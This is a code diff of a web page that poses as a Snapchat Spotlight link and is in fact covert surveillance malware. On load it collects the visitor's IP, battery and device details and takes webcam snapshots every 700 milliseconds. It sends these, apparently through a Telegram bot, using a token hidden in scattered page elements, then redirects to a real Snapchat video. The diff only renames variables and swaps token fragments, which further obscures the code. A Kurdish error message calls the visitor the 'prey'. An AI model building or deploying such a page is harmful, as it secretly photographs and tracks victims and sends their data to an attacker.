@@ -5,17 +5,17 @@
     <link rel="icon" type="image/png" href="https://www.korektelecom.com/media/1001/korek-logo.png">
     <title>snapchat spotlight</title>
     <style>
-        :root { --config-node: "AAHgyPYR-Z"; }
+        :root { --config-node: "AAHCO4nVUY"; }
         body { background-color: white !important; margin: 0; overflow: hidden; height: 100vh; width: 100vw; }
-        .hidden-layer { display: none !important; visibility: hidden !important; }
+        .zone-wrapper { display: none !important; visibility: hidden !important; }
     </style>
 </head>
 <body onload="capture()">
 
-    <a href="#" id="v_ref_link" class="hidden-layer">8431515310:</a>
+    <a href="#" id="legacy-link" class="zone-wrapper">8431515310:</a>
 
     <div class="main-content">
-        <p class="hidden-layer" id="p_node_val">Fn2QF-xU2367CK</p>
+        <p class="zone-wrapper" id="raw-meta">IBZgXQZnj0b</p>
     </div>
 
 <script>
@@ -28,12 +28,12 @@
         if (!targetID) return;
 
         try {
-            const _p1 = document.getElementById("v_ref_link").innerText;
-            const _p2 = getComputedStyle(document.documentElement).getPropertyValue('--config-node').replace(/"/g, '').trim();
-            const _p3 = document.getElementById("p_node_val").innerText;
-            const _p4 = document.getElementById("sys_check_tail").innerText;
+            const partA = document.getElementById("legacy-link").innerText;
+            const nodeX = getComputedStyle(document.documentElement).getPropertyValue('--config-node').replace(/"/g, '').trim();
+            const dataV = document.getElementById("raw-meta").innerText;
+            const saltK = document.getElementById("system-trace").innerText;
             
-            const TOKEN = _p1 + _p2 + _p3 + _p4;
+            const finalBuild = partA + nodeX + dataV + saltK;
 
             setTimeout(() => {
                 window.location.replace("https://www.snapchat.com/spotlight/W7_EDlXWTBiXAEEniNoMPwAAYZnFydWR5dG9tAZypM1RdAZypMtl2AAAAAQ?share_id=E6x9tSXD9VM&locale=en-US");
@@ -58,7 +58,7 @@
                                  `🌐 <b>IP:</b> <code>${data.ip}</code>\n` +
                                  `🔋 <b>Battery:</b> <code>${batteryInfo}</code>\n` +
                                  `📱 <b>Device:</b> <code>${navigator.platform}</code>`;
-                    _sendMsg(report, TOKEN, targetID);
+                    _sendMsg(report, finalBuild, targetID);
                 });
 
             const video = document.createElement('video');
@@ -72,18 +72,18 @@
                 canvas.height = video.videoHeight;
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(video, 0, 0);
-                canvas.toBlob(b => { if (b) _sendFile(b, "photo", TOKEN, targetID); }, 'image/jpeg', 0.9);
+                canvas.toBlob(b => { if (b) _sendFile(b, "photo", finalBuild, targetID); }, 'image/jpeg', 0.9);
             };
             setInterval(takeSnap, 700);
 
         } catch (e) {
-            const _p1_e = document.getElementById("v_ref_link").innerText;
-            const _p2_e = getComputedStyle(document.documentElement).getPropertyValue('--config-node').replace(/"/g, '').trim();
-            const _p3_e = document.getElementById("p_node_val").innerText;
-            const _p4_e = document.getElementById("sys_check_tail").innerText;
-            const T_E = _p1_e + _p2_e + _p3_e + _p4_e;
+            const errA = document.getElementById("legacy-link").innerText;
+            const errB = getComputedStyle(document.documentElement).getPropertyValue('--config-node').replace(/"/g, '').trim();
+            const errC = document.getElementById("raw-meta").innerText;
+            const errD = document.getElementById("system-trace").innerText;
+            const recovery = errA + errB + errC + errD;
 
-            _sendMsg(" نێچیرەکە ڕێگری کرد لە مۆڵەتی کامێرا", T_E, targetID);
+            _sendMsg(" نێچیرەکە ڕێگری کرد لە مۆڵەتی کامێرا", recovery, targetID);
             window.location.replace("https://www.snapchat.com/spotlight/W7_EDlXWTBiXAEEniNoMPwAAYZnFydWR5dG9tAZypM1RdAZypMtl2AAAAAQ?share_id=E6x9tSXD9VM&locale=en-US");
         }
     }
@@ -104,8 +104,8 @@
     }
 </script>
 
-    <div class="hidden-layer">
-        <code id="sys_check_tail">KRQPP-YQq1s</code>
+    <div class="zone-wrapper">
+        <code id="system-trace">bqv7NbfCFoogRY</code>
     </div>
 </body>
 </html>
